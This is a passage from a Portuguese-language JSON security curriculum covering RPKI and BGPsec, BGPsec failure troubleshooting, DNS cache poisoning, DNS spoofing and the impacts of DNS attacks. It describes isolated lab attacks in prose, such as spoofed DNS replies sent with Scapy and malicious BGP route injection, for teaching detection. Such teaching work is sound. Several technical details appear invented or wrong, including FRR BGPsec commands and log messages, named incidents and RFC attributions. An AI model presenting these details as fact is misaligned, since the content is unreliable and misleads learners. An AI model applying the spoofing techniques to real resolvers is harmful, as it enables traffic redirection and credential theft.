                                  "tips": "Comece com exemplos reais de ROAs publicadas para visualizar validações válidas/inválidas",
                                  "learningObjective": "Dominar como RPKI autentica a autorização de origens de rotas BGP usando PKI",
                                  "commonMistakes": [
                                    "Confundir RPKI com certificados SSL comuns",
                                    "Ignorar a dependência em RIRs para emissão de ROAs",
                                    "Achar que RPKI protege contra hijacks de caminho"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Compreender os Fundamentos do BGPsec",
                                  "subSteps": [
                                    "Estudar RFC 8205 para entender BGPsec como extensão de BGP com assinatura de caminhos",
                                    "Mapear o processo: cada AS assina o UPDATE BGP com sua chave privada, propagando assinaturas",
                                    "Comparar com BGP padrão: foco em integridade do caminho AS completo",
                                    "Instalar e configurar um laboratório com ExaBGP ou Bird para simular BGPsec",
                                    "Analisar overhead: aumento no tamanho das mensagens BGP devido a criptografia"
                                  ],
                                  "verification": "Gerar um exemplo de mensagem BGPsec assinada em um lab e decodificá-la com Wireshark",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "RFC 8205",
                                    "Wireshark com plugin BGP",
                                    "ExaBGP ou FRR com suporte BGPsec",
                                    "Labs virtuais como GNS3"
                                  ],
                                  "tips": "Use ambientes virtuais para evitar impacto em redes reais; foque em parsing de TLVs de BGPsec",
                                  "learningObjective": "Explicar o mecanismo de assinatura criptográfica em caminhos BGP via BGPsec",
                                  "commonMistakes": [
                                    "Pensar que BGPsec substitui RPKI",
                                    "Subestimar o overhead computacional em roteadores",
                                    "Confundir assinatura por AS com validação de origem"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Diferenças e Complementaridades",
                                  "subSteps": [
                                    "Criar uma tabela comparativa: RPKI (validação origem, pull model) vs BGPsec (validação caminho, push model)",
                                    "Discutir complementaridades: RPKI para origens + BGPsec para caminhos completos",
                                    "Identificar cenários onde um é insuficiente: RPKI falha em hijacks de caminho, BGPsec em origens falsas",
                                    "Mapear limitações compartilhadas: adoção lenta, dependência PKI",
                                    "Debater trade-offs: RPKI mais simples/overhead baixo vs BGPsec mais seguro/overhead alto"
                                  ],
                                  "verification": "Produzir uma tabela ou mindmap destacando 5 diferenças chave e 3 complementaridades",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Planilha Google Sheets ou Draw.io para tabelas",
                                    "Artigos de NANOG sobre BGP security"
                                  ],
                                  "tips": "Use cores na tabela para destacar forças (verde) e fraquezas (vermelho) de cada protocolo",
                                  "learningObjective": "Articular diferenças técnicas e como RPKI e BGPsec se complementam em segurança BGP",
                                  "commonMistakes": [
                                    "Achar que são mutuamente exclusivos",
                                    "Ignorar que ambos usam PKI mas validam aspectos diferentes",
                                    "Superestimar maturidade de BGPsec na prática"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Explorar Casos de Uso e Limitações Práticas",
                                  "subSteps": [
                                    "Pesquisar casos reais: RPKI em hijack do YouTube 2008 (pós-implantação), BGPsec em trials de ISPs",
                                    "Analisar limitações: Overhead BGPsec (até 10x mensagens maiores), adoção RPKI ~30% global",
                                    "Simular um ataque: BGP hijack e mostrar como cada mitiga/falha",
                                    "Discutir futuras evoluções: MANRS, SIDR v2",
                                    "Avaliar custo-benefício para diferentes tamanhos de rede"
                                  ],
                                  "verification": "Escrever um relatório curto (300 palavras) com 2 casos de uso e 3 limitações por protocolo",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Relatórios MANRS",
                                    "Blog Cloudflare sobre BGP hijacks",
                                    "Estatísticas RPKI de services like rpki.net"
                                  ],
                                  "tips": "Busque dados recentes de adoção para contextualizar viabilidade prática",
                                  "learningObjective": "Avaliar aplicações reais e barreiras para implementação de BGPsec e RPKI",
                                  "commonMistakes": [
                                    "Focar só em teoria sem dados de adoção",
                                    "Ignorar impacto em roteadores legacy",
                                    "Subestimar coordenação inter-AS necessária"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um laboratório GNS3 com 4 ASes, simule um BGP hijack: configure RPKI para validar origem (bloqueia anúncio falso de prefixo), adicione BGPsec para validar caminho (detecta alteração intermediária). Compare logs Wireshark antes/depois, medindo overhead de mensagens (RPKI: cache local; BGPsec: +500 bytes por UPDATE).",
                              "finalVerifications": [
                                "Explicar verbalmente 3 diferenças principais entre RPKI e BGPsec",
                                "Identificar um cenário onde RPKI sozinho falha e BGPsec resolve",
                                "Listar 2 limitações computacionais de BGPsec com números aproximados",
                                "Validar uma rota real com RPKI toolkit e discutir se BGPsec melhoraria",
                                "Criar diagrama mostrando fluxo complementar dos dois protocolos",
                                "Debater prós/cons em uma rede ISP de médio porte"
                              ],
                              "assessmentCriteria": [
                                "Precisão técnica na distinção de validação de origem (RPKI) vs caminho (BGPsec): 25%",
                                "Profundidade na análise de complementaridades e casos híbridos: 20%",
                                "Uso de evidências reais (RFCs, stats de adoção): 20%",
                                "Clareza em tabelas/diagramas comparativos: 15%",
                                "Consideração de limitações práticas (overhead, adoção): 10%",
                                "Criatividade em exemplos práticos/labs: 10%"
                              ],
                              "crossCurricularConnections": [
                                "Criptografia: Uso de PKI, assinaturas digitais (PKIX)",
                                "Redes: Protocolos BGP avançados, roteamento interdomínio",
                                "Segurança Cibernética: Detecção de prefix hijacking, threat modeling",
                                "Gestão de Infraestrutura: Políticas MANRS, conformidade RIR",
                                "Análise de Dados: Estatísticas de adoção RPKI/BGPsec via APIs"
                              ],
                              "realWorldApplication": "Provedores de Internet (ISPs) como Level3 ou Hurricane Electric usam RPKI para filtrar anúncios inválidos diários, prevenindo hijacks como o da PA Routing 2021; BGPsec está em pilots para validar caminhos em redes críticas, reduzindo riscos em IXPs globais apesar de overhead, complementando ferramentas como BGPmon para monitoramento."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.3.1.2.2",
                              "10.1.3.1.3.1"
                            ]
                          },
                          {
                            "id": "10.1.3.1.3.4",
                            "name": "Detectar falhas em implementações BGPsec",
                            "description": "Simular falhas como chaves comprometidas ou rejeição de caminhos inválidos, usando logs e ferramentas de depuração para troubleshooting.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Ambiente de Simulação BGPsec",
                                  "subSteps": [
                                    "Instale e configure roteadores virtuais usando GNS3 ou EVE-NG com suporte a FRR (Free Range Routing).",
                                    "Habilite BGPsec nos roteadores, gerando e distribuindo chaves criptográficas válidas via um servidor de gerenciamento de chaves (KMP).",
                                    "Estabeleça sessões BGP peer-to-peer entre 3-4 roteadores simulando uma topologia AS simples.",
                                    "Verifique a propagação inicial de rotas BGPsec válidas usando comandos 'show bgpsec'.",
                                    "Configure logging detalhado para BGP e BGPsec em todos os roteadores."
                                  ],
                                  "verification": "Execute 'show bgpsec summary' em todos os roteadores e confirme que rotas válidas estão sendo anunciadas sem erros.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "GNS3 ou EVE-NG instalado",
                                    "FRR com BGPsec habilitado",
                                    "Documentação BGPsec RFC 8205",
                                    "Chaves criptográficas de teste geradas"
                                  ],
                                  "tips": "Use imagens de FRR recentes que suportem BGPsec experimental; teste conectividade básica antes de habilitar segurança.",
                                  "learningObjective": "Entender e montar um ambiente controlado para testar implementações BGPsec.",
                                  "commonMistakes": "Esquecer de sincronizar chaves entre roteadores, levando a falhas iniciais de autenticação."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Simular Falhas Comuns em BGPsec",
                                  "subSteps": [
                                    "Simule chave comprometida: Substitua uma chave privada em um roteador AS por uma chave inválida ou conhecida.",
                                    "Simule rejeição de caminhos inválidos: Injete um prefixo BGP com assinatura BGPsec corrompida usando um script ou ferramenta de teste.",
                                    "Configure um roteador malicioso para anunciar rotas sem assinatura válida ou com timestamp expirado.",
                                    "Propague as rotas maliciosas através da topologia e monitore o comportamento dos peers.",
                                    "Registre timestamps e eventos em logs para análise posterior."
                                  ],
                                  "verification": "Confirme via logs que pelo menos uma rota inválida foi anunciada e propagada para pelo menos 2 peers.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Scripts de teste BGPsec (ex: Python com ExaBGP)",
                                    "Ferramentas de geração de chaves como OpenSSL",
                                    "Topologia GNS3 salva do Step 1"
                                  ],
                                  "tips": "Use ExaBGP para injeções rápidas de rotas maliciosas sem alterar configurações manuais.",
                                  "learningObjective": "Reproduzir cenários de falha realistas em BGPsec para observação de impactos.",
                                  "commonMistakes": "Não isolar o roteador malicioso, causando falha total na topologia."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Logs e Usar Ferramentas de Depuração",
                                  "subSteps": [
                                    "Colete logs BGP de todos os roteadores usando 'show log' ou tail em arquivos de log.",
                                    "Use Wireshark ou tcpdump para capturar pacotes BGP UPDATE com filtros 'bgp' e analise campos BGPsec (Crypto Header, Signature Blocks).",
                                    "Execute comandos de depuração como 'debug bgpsec all' no FRR e interprete mensagens de erro (ex: 'BGPSEC validation failed').",
                                    "Correlacione logs entre roteadores para traçar a origem da falha (chave inválida vs. assinatura corrompida).",
                                    "Documente padrões de falha, como rejeição de caminhos ou drops de sessões."
                                  ],
                                  "verification": "Identifique pelo menos 3 entradas de log específicas indicando falha BGPsec e explique sua causa.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Wireshark/tcpdump",
                                    "FRR CLI access",
                                    "Guia de campos BGPsec (RFC 8207)"
                                  ],
                                  "tips": "Filtre Wireshark por 'bgpsec' para isolar pacotes relevantes e evite sobrecarga de captura.",
                                  "learningObjective": "Dominar ferramentas de depuração para diagnosticar problemas BGPsec via evidências de rede.",
                                  "commonMistakes": "Ignorar fusos horários em timestamps de logs, levando a correlações erradas."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Verificar Detecção e Mitigar Falhas",
                                  "subSteps": [
                                    "Compare logs contra critérios BGPsec: confirme rejeição de rotas com chaves comprometidas ou assinaturas inválidas.",
                                    "Teste políticas de roteamento para drop automático de caminhos inválidos via configurações BGPsec.",
                                    "Simule recuperação: Revogue chaves comprometidas e reestabeleça sessões com novas chaves.",
                                    "Valide que rotas limpas são aceitas pós-mitigação.",
                                    "Gere relatório de troubleshooting resumindo falha, detecção e resolução."
                                  ],
                                  "verification": "Demonstre que rotas inválidas foram rejeitadas e topologia restaurada sem falhas persistentes.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Ferramentas de revogação de chaves (KMP simulado)",
                                    "Templates de relatório"
                                  ],
                                  "tips": "Automatize revogações com scripts para simulações repetíveis.",
                                  "learningObjective": "Confirmar mecanismos de detecção BGPsec e praticar troubleshooting end-to-end.",
                                  "commonMistakes": "Não testar recuperação, assumindo detecção como fim do processo."
                                }
                              ],
                              "practicalExample": "Em um lab GNS3 com 4 roteadores FRR (AS1-AS4), comprometa a chave privada do AS3 injetando uma rota prefixo 10.0.0.0/24 com assinatura inválida. Use Wireshark para capturar o UPDATE rejeitado no AS4, onde logs mostram 'BGPSEC_SIG_INVALID_KEY' e o caminho é descartado, prevenindo hijack de prefixo.",
                              "finalVerifications": [
                                "Todos os logs mostram rejeição explícita de rotas BGPsec inválidas.",
                                "Ferramentas de depuração identificam causa raiz corretamente (ex: chave comprometida).",
                                "Topologia BGPsec restaura funcionalidade após mitigação.",
                                "Relatório documenta pelo menos 2 tipos de falha simulada.",
                                "Nenhuma rota inválida é aceita em peers downstream."
                              ],
                              "assessmentCriteria": [
                                "Precisão na simulação de falhas (chaves/serviços corretos).",
                                "Análise completa de logs e pacotes com evidências.",
                                "Eficiência no troubleshooting (tempo e passos lógicos).",
                                "Relatório claro com verificações e lições aprendidas.",
                                "Compreensão demonstrada de RFCs BGPsec em explicações.",
                                "Sucesso na recuperação sem side-effects."
                              ],
                              "crossCurricularConnections": [
                                "Criptografia: Validação de assinaturas digitais e gerenciamento de chaves.",
                                "Redes: Protocolos de roteamento dinâmico e análise de tráfego.",
                                "Segurança Cibernética: Detecção de ataques de hijacking de rota.",
                                "Programação: Scripts para automação de testes BGP."
                              ],
                              "realWorldApplication": "Em provedores de internet (ISPs), detectar falhas BGPsec previne rota leaks ou hijacks, como o incidente de 2021 com chaves AS expiradas, mantendo integridade global de roteamento BGP."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.3.1.3.2"
                            ]
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.3.2",
                    "name": "Segurança em DNS",
                    "description": "Protocolos como DNSSEC para autenticação e integridade de respostas DNS contra envenenamento e spoofing.",
                    "individualConcepts": [
                      {
                        "id": "10.1.3.2.1",
                        "name": "Vulnerabilidades no DNS",
                        "description": "Principais ameaças ao protocolo DNS, incluindo envenenamento de cache (cache poisoning) e spoofing, que permitem redirecionamento de tráfego e roubo de dados.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.2.1.1",
                            "name": "Identificar envenenamento de cache DNS",
                            "description": "Explicar o mecanismo de envenenamento de cache DNS, onde um atacante insere registros falsos no cache de um resolvedor DNS, explorando previsibilidade de IDs de transação e portas fonte.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Funcionamento Normal do Cache DNS",
                                  "subSteps": [
                                    "Estude a hierarquia DNS: root servers, TLD servers e authoritative name servers.",
                                    "Explique como um resolvedor DNS consulta servidores recursivamente e armazena respostas no cache.",
                                    "Descreva o formato de uma mensagem DNS: header (com ID de transação, flags), question, answer, authority e additional sections.",
                                    "Simule uma resolução DNS normal usando ferramentas como dig ou nslookup.",
                                    "Analise como o cache armazena registros (TTL, tipo A, CNAME, etc.) para respostas positivas e negativas."
                                  ],
                                  "verification": "Responda corretamente a perguntas sobre o fluxo de uma resolução DNS e demonstre com dig +trace.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação RFC 1035",
                                    "Ferramentas: dig, nslookup",
                                    "Diagrama de fluxo DNS"
                                  ],
                                  "tips": "Use diagramas visuais para mapear o fluxo; foque no papel do cache em otimizar consultas repetidas.",
                                  "learningObjective": "Entender os componentes e o processo padrão de resolução e cache DNS.",
                                  "commonMistakes": [
                                    "Confundir resolvedor recursivo com authoritative server",
                                    "Ignorar o papel do TTL no cache",
                                    "Não diferenciar cache positivo de negativo"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Vulnerabilidades no Protocolo DNS",
                                  "subSteps": [
                                    "Analise o header DNS: ID de 16 bits previsível em implementações antigas.",
                                    "Estude a previsibilidade de portas fonte UDP (acima de 1024) usadas por resolvedores.",
                                    "Discuta a falta de autenticação nas respostas DNS (UDP sem criptografia).",
                                    "Examine ataques de birthday paradox para adivinhar ID e porta (2^20 tentativas viáveis).",
                                    "Revise histórico: vulnerabilidades em BIND e Windows DNS antes de patches."
                                  ],
                                  "verification": "Liste e explique pelo menos 3 vulnerabilidades específicas com exemplos numéricos de probabilidades.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "RFC 1035 seção header",
                                    "Artigo Kaminsky Vulnerability",
                                    "Ferramenta Wireshark para capturar tráfego DNS"
                                  ],
                                  "tips": "Capture tráfego real com Wireshark para ver IDs e portas em ação; calcule probabilidades manualmente.",
                                  "learningObjective": "Reconhecer fraquezas protocolares que permitem envenenamento.",
                                  "commonMistakes": [
                                    "Subestimar impacto da previsibilidade UDP",
                                    "Confundir ID de transação com query ID",
                                    "Ignorar evolução para DNSSEC"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explicar o Mecanismo de Envenenamento de Cache",
                                  "subSteps": [
                                    "Descreva o fluxo do ataque: atacante envia respostas falsas para consultas legítimas antes da resposta real.",
                                    "Detalhe race condition: adivinhar ID/porta e spoofar IP do servidor DNS alvo.",
                                    "Explique inserção de registros falsos (ex: example.com -> IP atacante) com TTL longo.",
                                    "Simule com diagrama: múltiplas tentativas para acertar ID/porta e envenenar cache.",
                                    "Diferencie envenenamento off-path (sem conexão TCP) de on-path."
                                  ],
                                  "verification": "Crie um diagrama sequencial do ataque e narre-o em 2 minutos.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Diagramaferramentas como draw.io",
                                    "Vídeo explicativo Kaminsky attack",
                                    "Lab virtual com Scapy para simulação básica"
                                  ],
                                  "tips": "Pense em termos de timing: resposta falsa deve chegar primeiro; use Scapy para prototipar.",
                                  "learningObjective": "Mapear o passo-a-passo do ataque de envenenamento.",
                                  "commonMistakes": [
                                    "Confundir com DNS amplification",
                                    "Não considerar TTL para persistência",
                                    "Ignorar necessidade de múltiplas tentativas"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Detectar e Identificar Sinais de Envenenamento",
                                  "subSteps": [
                                    "Monitore logs de resolvedor por respostas inesperadas ou duplicadas.",
                                    "Use ferramentas como dnsdumpster ou Wireshark para verificar inconsistências em IPs resolvidos.",
                                    "Implemente validação: compare respostas com fontes confiáveis (Google DNS 8.8.8.8).",
                                    "Configure alertas para TTL suspeitos ou domínios com múltiplos IPs.",
                                    "Teste com queries conhecidas e verifique cache com 'rndc dumpdb' em BIND."
                                  ],
                                  "verification": "Identifique envenenamento simulado em um lab e liste evidências.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Wireshark",
                                    "BIND ou Unbound DNS server",
                                    "Scripts de monitoramento como dnsrecon"
                                  ],
                                  "tips": "Sempre valide cross-DNS servers; procure por domínios 'phishing-like' em cache.",
                                  "learningObjective": "Aplicar técnicas para detectar envenenamento em ambiente controlado.",
                                  "commonMistakes": [
                                    "Confiar apenas em um resolvedor",
                                    "Não flushar cache para testes",
                                    "Ignorar NXDOMAIN falsos"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab com VirtualBox, configure um resolvedor DNS vulnerável (BIND antigo). Use Scapy para enviar pacotes spoofados adivinhando ID/porta, direcionando 'bank.com' para IP atacante. Verifique cache com 'dig bank.com' mostrando IP falso, simulando redirecionamento para site phishing.",
                              "finalVerifications": [
                                "Explicar com precisão o papel de ID de transação e porta fonte no ataque.",
                                "Desenhar diagrama completo do fluxo de envenenamento.",
                                "Identificar 3 sinais de envenenamento em logs Wireshark.",
                                "Diferenciar envenenamento de cache de hijacking de authoritative server.",
                                "Propor 2 mitigações básicas (randomização de porta, DNSSEC)."
                              ],
                              "assessmentCriteria": [
                                "Precisão técnica na descrição do mecanismo (sem erros factuais).",
                                "Completude dos steps: todos subSteps detalhados e acionáveis.",
                                "Criatividade no practicalExample: realista e reproduzível.",
                                "Relevância das verificações: mensuráveis e específicas.",
                                "Profundidade nas conexões interdisciplinares.",
                                "Clareza na aplicação real: impacto mensurável."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Análise de pacotes UDP/IP com Wireshark (CCNA).",
                                "Criptografia: Introdução a DNSSEC e assinatura digital (Cryptography 101).",
                                "Programação: Scripts Python/Scapy para simulação de ataques.",
                                "Ética: Discussão sobre leis de cibersegurança (CFAA, GDPR).",
                                "Matemática: Probabilidades e birthday attack (Estatística)."
                              ],
                              "realWorldApplication": "Em uma empresa, detectar envenenamento permite prevenir phishing direcionado, como no incidente de 2008 Kaminsky que afetou milhões de domínios, evitando roubo de credenciais e downtime em serviços críticos como banking online."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.2.1.2",
                            "name": "Descrever ataques de spoofing DNS",
                            "description": "Detalhar como o spoofing DNS ocorre por meio de respostas falsificadas antes da legítima, explorando latência de rede e falta de autenticação nas consultas UDP.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o funcionamento básico do DNS",
                                  "subSteps": [
                                    "Estude o processo de resolução de nomes DNS: consulta recursiva, iterativa e de cache.",
                                    "Identifique os componentes principais: resolvedor (stub resolver), servidor recursivo e servidor autoritativo.",
                                    "Analise o formato de uma mensagem DNS: header, questions, answers, authority e additional.",
                                    "Revise o fluxo típico de uma consulta DNS UDP na porta 53.",
                                    "Pratique traçando uma resolução DNS real usando ferramentas como dig ou nslookup."
                                  ],
                                  "verification": "Realize uma consulta DNS com 'dig example.com' e explique o output em um diagrama simples.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Ferramentas: dig, nslookup; Documentos: RFC 1035; Wireshark para captura de pacotes.",
                                  "tips": "Use diagramas visuais para mapear o fluxo DNS; foque em como o cache afeta respostas subsequentes.",
                                  "learningObjective": "Entender o protocolo DNS padrão e seu fluxo de consulta para contextualizar vulnerabilidades.",
                                  "commonMistakes": "Confundir resolução recursiva com iterativa; ignorar o papel do cache do resolvedor."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar vulnerabilidades do UDP no DNS",
                                  "subSteps": [
                                    "Explique por que o DNS usa UDP por padrão: baixa latência e sem handshake.",
                                    "Discuta a falta de autenticação nativa: consultas e respostas não são assinadas.",
                                    "Estude a latência de rede como fator crítico em ataques de corrida (race condition).",
                                    "Capture tráfego DNS com Wireshark e observe IDs de transação e portas de origem/ephemeral.",
                                    "Simule atrasos de rede para entender como respostas chegam fora de ordem."
                                  ],
                                  "verification": "Capture uma consulta DNS e identifique campos como Transaction ID, source port e flags no Wireshark.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Wireshark; Ambiente de rede local; RFC 1035 seção sobre transporte UDP.",
                                  "tips": "Filtre pacotes com 'dns' no Wireshark para isolar tráfego relevante; teste em redes com latência variável.",
                                  "learningObjective": "Identificar fraquezas específicas do UDP que habilitam spoofing no DNS.",
                                  "commonMistakes": "Subestimar o papel das portas efêmeras; achar que TCP elimina todas as vulnerabilidades."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Detalhar o mecanismo do ataque de spoofing DNS",
                                  "subSteps": [
                                    "Descreva o ataque: atacante envia resposta falsificada com mesmo Transaction ID e source port antes da legítima.",
                                    "Explique a exploração da race condition: adivinhar ID (16 bits) e porta (16 bits), com 2^32 possibilidades.",
                                    "Analise técnicas de adivinhação: birthdays attacks ou Kaminsky (usando subdomínios para vazar IDs).",
                                    "Simule o spoofing usando Scapy: craft uma resposta DNS falsa e envie via UDP.",
                                    "Compare chegada da resposta falsa vs. legítima devido a latência controlada pelo atacante."
                                  ],
                                  "verification": "Crie um script simples em Python/Scapy que gera uma resposta DNS spoofada e teste em lab isolado.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Python com Scapy instalado; Ambiente virtualizado (VirtualBox com DNS local); Wireshark.",
                                  "tips": "Use labs como dnsspoof no Kali Linux; sempre isole o ambiente para evitar impactos reais.",
                                  "learningObjective": "Dominar o passo-a-passo do spoofing, focando em falsificação de respostas UDP.",
                                  "commonMistakes": "Ignorar o timing crítico; confundir com cache poisoning sem explicar a injeção inicial."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Avaliar impactos e mitigações básicas",
                                  "subSteps": [
                                    "Liste consequências: redirecionamento para sites maliciosos, phishing ou exfiltração de dados.",
                                    "Discuta mitigações: DNSSEC para autenticação, randomização de IDs/portas (0x20 encoding), uso de TCP.",
                                    "Analise ataques históricos como Kaminsky 2008 e suas explorações em massa.",
                                    "Crie um relatório resumindo o ataque em 1 página com diagrama.",
                                    "Debata limitações: DNSSEC não é universalmente adotado."
                                  ],
                                  "verification": "Escreva uma descrição completa do ataque em 200-300 palavras, incluindo diagrama.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Editor de texto; Artigos sobre Kaminsky attack; Diagramas online (draw.io).",
                                  "tips": "Inclua fluxogramas mostrando 'resposta legítima' vs. 'falsa'; pesquise CVEs relacionados.",
                                  "learningObjective": "Conectar teoria a impactos reais e soluções preventivas.",
                                  "commonMistakes": "Focar só no 'como' sem 'por quê' ou impactos; superestimar eficácia de mitigações antigas."
                                }
                              ],
                              "practicalExample": "Em um lab com VirtualBox, configure um resolvedor DNS vítima (Bind9), um servidor legítimo e um atacante. Use Scapy no atacante para floodar respostas falsas com IDs/portas adivinhados durante uma consulta 'dig evil.com', redirecionando para IP malicioso. Verifique no Wireshark a resposta falsa chegando primeiro devido a latência simulada.",
                              "finalVerifications": [
                                "Explicar verbalmente o fluxo completo de spoofing em menos de 2 minutos.",
                                "Identificar corretamente 3 vulnerabilidades UDP no DNS.",
                                "Simular uma resposta spoofada em ferramenta como Scapy sem erros.",
                                "Desenhar diagrama de race condition com timing de pacotes.",
                                "Listar 2 mitigações e suas limitações.",
                                "Relatar um exemplo real como Kaminsky attack."
                              ],
                              "assessmentCriteria": [
                                "Precisão técnica na descrição do mecanismo de falsificação (Transaction ID, portas).",
                                "Clareza na explicação da race condition e latência UDP.",
                                "Profundidade nos subpassos: inclusão de adivinhação e cache poisoning.",
                                "Uso correto de terminologia (resolvedor, autoritativo, UDP vs TCP).",
                                "Integração de exemplos práticos e verificações.",
                                "Análise de impactos e mitigações relevantes."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolos UDP/TCP e latência de rede.",
                                "Criptografia: Autenticação via DNSSEC e assinaturas digitais.",
                                "Programação: Scripts de rede com Python/Scapy para simulações.",
                                "Ética e Direito: Implicações legais de ataques cibernéticos.",
                                "Análise de Dados: Captura e filtro de pacotes com Wireshark."
                              ],
                              "realWorldApplication": "Em empresas, compreender spoofing DNS permite configurar proteções como DNSSEC e firewalls que randomizam portas, prevenindo redirecionamentos maliciosos em ataques como o Kaminsky de 2008, que explorou milhões de servidores, ou em campanhas de phishing atuais contra usuários corporativos."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.2.1.3",
                            "name": "Analisar impactos de ataques DNS",
                            "description": "Avaliar consequências como phishing direcionado, interrupção de serviços e roubo de credenciais, com exemplos reais de campanhas de malware.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar Tipos Comuns de Ataques DNS e Seus Mecanismos Básicos",
                                  "subSteps": [
                                    "Estude DNS spoofing (cache poisoning) e como ele redireciona tráfego para sites maliciosos.",
                                    "Analise ataques de amplificação DNS, onde consultas pequenas geram respostas grandes para DoS.",
                                    "Revise DNS tunneling para exfiltração de dados e roubo de credenciais.",
                                    "Pesquise NXDOMAIN attacks que causam interrupções via respostas falsas.",
                                    "Documente como esses ataques exploram a natureza não criptografada do DNS tradicional."
                                  ],
                                  "verification": "Crie uma tabela resumindo 4 tipos de ataques DNS com mecanismo e impacto inicial.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "RFC 1035 (DNS Basics)",
                                    "OWASP DNS Security Cheat Sheet",
                                    "Vídeos do YouTube sobre DNS attacks (ex: Black Hat talks)"
                                  ],
                                  "tips": "Use diagramas para visualizar o fluxo de tráfego alterado no ataque.",
                                  "learningObjective": "Compreender os vetores técnicos de ataques DNS para mapear impactos subsequentes.",
                                  "commonMistakes": [
                                    "Confundir DNS attacks com DDoS genéricos sem especificar o papel do DNS",
                                    "Ignorar a distinção entre ataques de resolução e amplificação"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Mapear Impactos Diretos em Serviços, Usuários e Infraestrutura",
                                  "subSteps": [
                                    "Avalie phishing direcionado: redirecionamento para sites falsos levando a roubo de credenciais.",
                                    "Analise interrupção de serviços (DoS): indisponibilidade de sites e aplicações dependentes de DNS.",
                                    "Examine roubo de credenciais via tunneling ou hijacking de sessões.",
                                    "Considere propagação de malware: injeção de domínios maliciosos em caches DNS.",
                                    "Quantifique impactos com métricas como tempo de downtime ou taxa de infecção."
                                  ],
                                  "verification": "Desenvolva um fluxograma mostrando cadeia de impactos de um ataque DNS spoofing.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Ferramenta Wireshark para capturar tráfego DNS simulado",
                                    "Relatórios da Verizon DBIR sobre DNS incidents",
                                    "Artigo Krebs on Security sobre DNS hijacks"
                                  ],
                                  "tips": "Priorize impactos em camadas: rede, aplicação e usuário final.",
                                  "learningObjective": "Classificar e quantificar consequências imediatas de ataques DNS em diferentes stakeholders.",
                                  "commonMistakes": [
                                    "Superestimar impactos sem evidências reais",
                                    "Omitir efeitos em cadeia, como perda de confiança em marcas"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Estudar Exemplos Reais de Campanhas de Malware Envolvendo Ataques DNS",
                                  "subSteps": [
                                    "Analise o ataque Dyn DDoS (2016) usando Mirai botnet com amplificação DNS.",
                                    "Revise campanha NotPetya com DNS callbacks para C2 servers falsos.",
                                    "Estude DNS hijacking na Ucrânia (2017) afetando bancos e governo.",
                                    "Examine phishing via DNS em campanhas Emotet, com roubo de credenciais em massa.",
                                    "Compare métricas: downtime, vítimas afetadas e custos financeiros."
                                  ],
                                  "verification": "Escreva um relatório de 1 página com lições de 3 casos reais.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "Relatório oficial Dyn DDoS",
                                    "Mandiant M-Trends sobre DNS em malware",
                                    "Site Have I Been Pwned para credenciais roubadas"
                                  ],
                                  "tips": "Busque fontes primárias como comunicados de CERT para precisão.",
                                  "learningObjective": "Aplicar análise a incidentes históricos para validar impactos teóricos.",
                                  "commonMistakes": [
                                    "Usar exemplos desatualizados sem contexto moderno",
                                    "Focar só em impactos técnicos, ignorando econômicos"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Sintetizar Análise de Impactos e Avaliar Severidade Geral",
                                  "subSteps": [
                                    "Classifique impactos por severidade (baixo/médio/alto) usando CVSS para DNS vulns.",
                                    "Avalie efeitos de longo prazo: perda de reputação, conformidade regulatória (GDPR).",
